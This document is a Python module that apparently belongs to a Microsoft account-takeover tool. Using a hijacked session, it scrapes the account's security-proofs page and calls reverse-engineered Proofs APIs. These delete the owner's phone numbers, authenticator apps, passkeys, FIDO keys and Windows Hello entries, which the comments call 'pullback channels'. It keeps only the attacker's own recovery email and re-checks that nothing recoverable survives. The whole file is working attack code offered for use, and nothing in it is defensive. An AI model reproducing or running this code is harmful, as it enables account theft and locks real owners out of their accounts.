import codecs
import json
import logging
import re

import httpx

logger = logging.getLogger(__name__)

_PROOFS_PAGE = (
    "https://account.live.com/proofs/manage/additional"
    "?mkt=en-US&refd=account.microsoft.com&refp=security"
)

# ServerData array keys on the manage-proofs page
_PROOF_ARRAY_KEYS = (
    "emailProofs",
    "smsProofs",
    "phoneProofs",
    "totpProofs",
    "appProofs",
    "msAuthApp",
    "alternateAuthApp",
    # Modern passkeys (iCloud Keychain, Samsung Pass, Google PM, …)
    "passKeys",
    "passkeyProofs",  # legacy / alternate blob name
    # Hardware security keys (USB / NFC / Bluetooth FIDO)
    "securityKeys",
    "fidoProofs",
    "windowsHelloProofs",
    "helloKeys",
    "alternateEmailProofs",
)

# Never keep these — they are classic pullback channels
_ALWAYS_DELETE_TYPES = frozenset(
    {
        "sms",
        "phone",
        "text",
        "mobile",
        "totp",
        "authenticator",
        "app",
        "passkey",
        "passkeys",
        "fido",
        "securitykey",
        "securitykeys",
        "windowshello",
        "hellokeys",
        "hello",
    }
)

_REMOVE_PASSKEY_URL = "https://account.live.com/API/Proofs/RemovePasskey"
_REMOVE_FIDO_URL = "https://account.live.com/API/Proofs/RemoveFido"
_DELETE_PROOF_URL = "https://account.live.com/API/Proofs/DeleteProof"

# Keys / type hints that must use RemovePasskey (not DeleteProof).
# iCloud Keychain + Samsung Pass live here as passkey credentials.
_PASSKEY_KEYS = frozenset({"passKeys", "passkeyProofs"})
_FIDO_KEYS = frozenset({"securityKeys", "fidoProofs", "helloKeys", "windowsHelloProofs"})


def _decode_ms(s: str) -> str:
    text = codecs.decode(s or "", "unicode_escape")
    return text.replace("\u0040", "@").strip()


def _extract_json_array(html: str, key: str) -> list | None:
    """Extract a JSON array value for ``"key": [...]`` from MS ServerData HTML."""
    m = re.search(rf'"{re.escape(key)}"\s*:\s*', html or "")
    if not m:
        return None
    i = m.end()
    if i >= len(html) or html[i] != "[":
        return None
    depth = 0
    for j in range(i, len(html)):
        ch = html[j]
        if ch == "[":
            depth += 1
        elif ch == "]":
            depth -= 1
            if depth == 0:
                raw = html[i : j + 1]
                try:
                    data = json.loads(raw)
                except json.JSONDecodeError:
                    try:
                        data = json.loads(raw.encode().decode("unicode_escape"))
                    except Exception:
                        return None
                return data if isinstance(data, list) else [data]
    return None


def _extract_json_value(html: str, key: str):
    """Extract array OR single object for ``"key": …`` (msAuthApp is often one object)."""
    arr = _extract_json_array(html, key)
    if arr is not None:
        return arr
    m = re.search(rf'"{re.escape(key)}"\s*:\s*', html or "")
    if not m:
        return None
    i = m.end()
    if i >= len(html) or html[i] != "{":
        return None
    depth = 0
    for j in range(i, len(html)):
        ch = html[j]
        if ch == "{":
            depth += 1
        elif ch == "}":
            depth -= 1
            if depth == 0:
                raw = html[i : j + 1]
                try:
                    data = json.loads(raw)
                except Exception:
                    return None
                return [data] if isinstance(data, dict) else None
    return None


def _should_keep_proof(
    display: str,
    *,
    keep_emails: set[str],
    keep_domain: str,
    proof_type: str = "",
) -> bool:
    ptype = re.sub(r"[^a-z]", "", (proof_type or "").lower())
    if ptype and any(t in ptype for t in _ALWAYS_DELETE_TYPES):
        return False

    disp = (display or "").strip().lower()
    if not disp:
        return False
    if disp in keep_emails:
        return True
    # Masked forms like 0f*****@ilovevbucks.site — match by domain + local prefix
    if keep_domain and disp.endswith(f"@{keep_domain}"):
        return True
    for keep in keep_emails:
        if "@" not in keep or "@" not in disp:
            continue
        k_local, k_dom = keep.split("@", 1)
        d_local, d_dom = disp.split("@", 1)
        if k_dom != d_dom:
            continue
        if d_local == k_local:
            return True
        if "*" in d_local:
            prefix = d_local.split("*", 1)[0]
            if prefix and k_local.startswith(prefix):
                return True
    return False


def _removal_kind(array_key: str, ptype: str, display: str) -> str:
    """Return ``passkey`` | ``fido`` | ``proof`` for the right API."""
    key_l = (array_key or "").lower()
    ptype_l = re.sub(r"[^a-z]", "", (ptype or "").lower())
    disp_l = (display or "").lower()

    if array_key in _PASSKEY_KEYS or "passkey" in ptype_l or "passkey" in key_l:
        return "passkey"
    if array_key in _FIDO_KEYS or "fido" in ptype_l or "securitykey" in ptype_l:
        return "fido"
    # Name-based: iCloud Keychain / Samsung Pass show up as passkey display names
    if any(
        s in disp_l
        for s in (
            "icloud",
            "keychain",
            "samsung pass",
            "samsungpass",
            "google password manager",
            "1password",
            "bitwarden",
            "dashlane",
        )
    ):
        return "passkey"
    return "proof"


async def _api_json(
    session: httpx.AsyncClient,
    url: str,
    apicanary: str,
    payload: dict,
) -> tuple[bool, str | None]:
    resp = await session.post(
        url=url,
        headers={
            "host": "account.live.com",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "canary": apicanary,
            "Referer": _PROOFS_PAGE,
            "Origin": "https://account.live.com",
        },
        json=payload,
        follow_redirects=False,
    )
    err_code = None
    try:
        data = resp.json()
        err = data.get("error") if isinstance(data, dict) else None
        if isinstance(err, dict):
            err_code = err.get("code")
        elif err is not None:
            err_code = err
    except Exception:
        pass
    ok = resp.status_code == 200 and not err_code
    return ok, (None if ok else str(err_code or resp.status_code))


async def _delete_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    proof_id: str,
    *,
    label: str,
    kind: str = "proof",
) -> bool:
    """Delete via the correct Proofs API for this credential type.

    Reversed from manageproofsv2:
      RemovePasskey → {"credentialId": proof.proofId}   (iCloud / Samsung Pass / …)
      RemoveFido    → {"credentialId": proof.proofId}   (USB security keys)
      DeleteProof   → {"proofId": …}                    (email / SMS / TOTP / apps)
    """
    if kind == "passkey":
        ok, err = await _api_json(
            session,
            _REMOVE_PASSKEY_URL,
            apicanary,
            {"credentialId": proof_id},
        )
        api = "RemovePasskey"
    elif kind == "fido":
        ok, err = await _api_json(
            session,
            _REMOVE_FIDO_URL,
            apicanary,
            {"credentialId": proof_id},
        )
        api = "RemoveFido"
    else:
        # Legacy DeleteProof (same shape the web client uses for email/SMS)
        ok, err = await _api_json(
            session,
            _DELETE_PROOF_URL,
            apicanary,
            {
                "proofId": proof_id,
                "uaid": "114b68368b7b46afa44c82a8246e4a44",
                "uiflvr": 1001,
                "scid": 100109,
                "hpgid": 201030,
            },
        )
        api = "DeleteProof"

    if ok:
        print(f"Removed Proof via {api} ({label})")
        return True
    print(f"[X] - {api} failed for ({label}) err={err}")
    logger.warning("%s failed for %s err=%s", api, label, err)
    return False


async def remove_proof(
    session: httpx.AsyncClient,
    apicanary: str,
    *,
    keep_security_email: str | None = None,
    keep_domain: str | None = None,
):
    """Remove foreign proofs / phones / apps / passkeys; keep our recovery email.

    Passkeys (incl. Apple iCloud Keychain + Samsung Pass) must use RemovePasskey.
    Federated sign-in (Sign in with Samsung/Apple) is handled by remove_fed_cred.
    """
    proofs = await session.get(
        _PROOFS_PAGE,
        headers={
            "Accept-Language": "en-US,en;q=0.5",
            "Referer": "https://login.live.com/",
        },
        follow_redirects=True,
    )

    html = proofs.text or ""
    logging.info("Proofs response: %s", html[:2000])

    keep_emails: set[str] = set()
    if keep_security_email:
        ke = keep_security_email.strip().lower()
        if ke and ke not in {"couldn't change!", "unknown", "n/a"}:
            keep_emails.add(ke)
    domain = (keep_domain or "").strip().lower().lstrip("@")
    if not domain and keep_emails:
        sample = next(iter(keep_emails))
        if "@" in sample:
            domain = sample.split("@", 1)[1]

    deleted = 0
    kept = 0
    passkeys_removed = 0
    fido_removed = 0
    handled_ids: set[str] = set()
    saw_sms = False

    for key in _PROOF_ARRAY_KEYS:
        entries = _extract_json_value(html, key) or []
        for proof in entries:
            if not isinstance(proof, dict):
                continue
            pid = _decode_ms(
                str(proof.get("proofId") or proof.get("encryptedProofId") or "")
            )
            display = _decode_ms(
                str(
                    proof.get("displayProofName")
                    or proof.get("display")
                    or proof.get("displayProofId")
                    or proof.get("friendlyName")
                    or ""
                )
            )
            ptype = str(
                proof.get("proofType")
                or proof.get("channelType")
                or proof.get("type")
                or key
            )
            ptype_l = re.sub(r"[^a-z]", "", ptype.lower())
            if key in ("smsProofs", "phoneProofs") or any(
                t in ptype_l for t in ("sms", "phone", "text", "mobile")
            ):
                saw_sms = True
            if not pid:
                continue
            handled_ids.add(pid)
            label = f"{ptype}:{display or pid[:40]}"
            if _should_keep_proof(
                display,
                keep_emails=keep_emails,
                keep_domain=domain,
                proof_type=ptype,
            ):
                print(f"[~] - Keeping security email proof ({display})")
                kept += 1
                continue
            kind = _removal_kind(key, ptype, display)
            try:
                ok = await _delete_proof(
                    session, apicanary, pid, label=label, kind=kind
                )
                if ok:
                    deleted += 1
                    if kind == "passkey":
                        passkeys_removed += 1
                    elif kind == "fido":
                        fido_removed += 1
            except Exception as exc:
                logger.warning("proof remove failed for %s: %s", label, exc)

    # Raw proofId sweep for anything the structured lists missed (legacy email/SMS)
    for raw_id in re.findall(r'"proofId"\s*:\s*"([^"]+)"', html):
        proof = _decode_ms(raw_id)
        if not proof or proof in handled_ids:
            continue
        if _should_keep_proof(proof, keep_emails=keep_emails, keep_domain=domain):
            print(f"[~] - Keeping security email proof ({proof})")
            kept += 1
            continue
        try:
            ok = await _delete_proof(
                session, apicanary, proof, label=proof[:64], kind="proof"
            )
            if ok:
                deleted += 1
        except Exception as exc:
            logger.warning("DeleteProof failed for raw id: %s", exc)

    # Re-scrape: did any SMS/phone claim survive the wipe?
    sms_remaining = False
    passkeys_remaining = 0
    try:
        again = await session.get(
            _PROOFS_PAGE,
            headers={
                "Accept-Language": "en-US,en;q=0.5",
                "Referer": "https://login.live.com/",
            },
            follow_redirects=True,
        )
        html2 = again.text or ""
        for key in ("smsProofs", "phoneProofs"):
            for proof in _extract_json_value(html2, key) or []:
                if isinstance(proof, dict) and (
                    proof.get("proofId") or proof.get("encryptedProofId")
                ):
                    sms_remaining = True
                    break
            if sms_remaining:
                break
        for key in ("passKeys", "passkeyProofs"):
            for proof in _extract_json_value(html2, key) or []:
                if isinstance(proof, dict) and proof.get("proofId"):
                    passkeys_remaining += 1
    except Exception as exc:
        logger.warning("SMS/passkey re-scrape soft-skip: %s", exc)

    print(
        f"[+] - Removed proofs (deleted={deleted}, kept_ours={kept}, "
        f"passkeys={passkeys_removed}, fido={fido_removed}, "
        f"saw_sms={saw_sms}, sms_remaining={sms_remaining}, "
        f"passkeys_remaining={passkeys_remaining})"
    )
    return {
        "deleted": deleted,
        "kept": kept,
        "passkeys_removed": passkeys_removed,
        "fido_removed": fido_removed,
        "saw_sms": saw_sms,
        "has_sms_proof": sms_remaining,
        "passkeys_remaining": passkeys_remaining,
    }
